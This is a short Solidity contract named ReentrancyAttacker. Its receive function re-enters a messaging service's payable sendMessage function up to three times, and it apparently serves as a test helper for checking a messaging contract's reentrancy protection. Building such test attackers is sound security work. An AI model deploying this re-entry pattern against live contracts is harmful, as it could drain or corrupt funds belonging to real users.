// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMessaging {
    function sendMessage(address _kol, string memory _messageIpfsHash) external payable;
}

contract ReentrancyAttacker {
    IMessaging public messagingService;
    uint256 public attackCount;

    constructor(address _messagingService) {
        messagingService = IMessaging(_messagingService);
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        messagingService.sendMessage{value: msg.value}(address(this), "QmAttack");
    }

    receive() external payable {
        if (attackCount < 3) {
            attackCount++;
            messagingService.sendMessage{value: msg.value}(address(this), "QmReentrant");
        }
    }
} 